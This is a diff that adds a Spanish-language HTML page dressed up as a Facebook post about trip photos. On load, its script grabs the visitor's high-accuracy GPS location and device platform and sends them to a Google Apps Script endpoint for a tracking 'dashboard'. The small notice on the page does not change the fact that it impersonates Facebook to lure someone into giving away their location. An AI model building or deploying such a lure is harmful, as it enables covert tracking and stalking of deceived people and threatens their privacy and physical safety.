@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: system-ui, sans-serif; background: #18191a; color: #e4e6eb; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .facebook-container { width: 100%; max-width: 580px; height: 100vh; background: #242526; box-shadow: 0 0 20px rgba(0,0,0,0.9); overflow-y: auto; }
+        .fb-header { background: #1877f2; color: white; padding: 12px; text-align: center; font-size: 19px; font-weight: bold; }
+        .post { background: #242526; margin: 15px; border-radius: 8px; padding: 12px; }
+        .post-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .avatar { width: 45px; height: 45px; background: #3a3b3c; border-radius: 50%; }
+        .name { font-weight: 600; }
+        .time { color: #b0b3b8; font-size: 13px; }
+        .aviso { background: #3a3b3c; padding: 12px; border-radius: 8px; margin: 12px 0; border-left: 4px solid #1877f2; }
+        #status { margin: 15px 0; padding: 15px; border-radius: 8px; text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="facebook-container">
+        <div class="fb-header">facebook</div>
+        <div class="post">
+            <div class="post-header">
+                <div class="avatar"></div>
+                <div>
+                    <div class="name">María López</div>
+                    <div class="time">Hace 47 minutos · 🌍</div>
+                </div>
+            </div>
+            <div class="post-text" style="font-size:15px; line-height:1.4; margin-bottom:12px;">
+                Buenas noches gente ❤️<br><br>
+                Acabo de subir unas fotos del viaje del fin de semana. ¿Qué tal les parecen? 😍
+            </div>
+            <div style="background:#3a3b3c;height:280px;border-radius:8px;margin:10px 0;display:flex;align-items:center;justify-content:center;color:#777;">
+                📸 Foto del viaje
+            </div>
+
+            <div class="aviso">
+                <strong>ℹ️ Aviso:</strong> Esta página obtendrá tu ubicación con la mejor precisión posible y la guardará en el dashboard.
+            </div>
+
+            <div id="status">Buscando señal GPS...</div>
+        </div>
+    </div>
+
+    <script>
+        const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzRFXlNE-U-Izf5vodXUBGafia1EwA0RctNXRYQW7S41VY0iqdwTCfJhTuyHFALo83-/exec";
+
+        function enviarUbicacion(position) {
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+            const accuracy = Math.round(position.coords.accuracy);
+
+            fetch(APPS_SCRIPT_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    lat: lat,
+                    lon: lon,
+                    precision: accuracy + " metros",
+                    device: navigator.platform
+                }),
+                mode: "no-cors"
+            });
+
+            document.getElementById('status').innerHTML = `✅ Ubicación guardada correctamente<br>📍 ${lat}, ${lon} (±${accuracy}m)`;
+            document.getElementById('status').style.background = "#004d00";
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(enviarUbicacion, (err) => {
+                document.getElementById('status').innerHTML = "❌ Error: " + (err.code === 3 ? "Tiempo agotado. Prueba afuera con GPS." : err.message);
+            }, { 
+                enableHighAccuracy: true, 
+                timeout: 25000, 
+                maximumAge: 0 
+            });
+        }
+    </script>
+</body>
+</html>
